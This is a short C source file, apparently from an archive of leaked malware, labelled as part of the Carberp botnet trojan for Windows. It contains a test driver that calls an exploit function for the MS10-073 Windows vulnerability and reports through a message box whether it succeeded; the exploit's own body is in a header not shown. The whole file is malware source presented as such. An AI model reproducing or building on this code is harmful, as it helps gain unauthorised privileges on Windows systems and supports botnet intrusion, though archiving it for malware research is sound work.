/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>
#include "ms10_073.h"

int Entry()
{
	if( ExploitMS10_073() )
		MessageBox(0, "TRUE", "!!!", 0);
	else
		MessageBox(0, "FALSE", "!!!", 0);
	return 0;
}
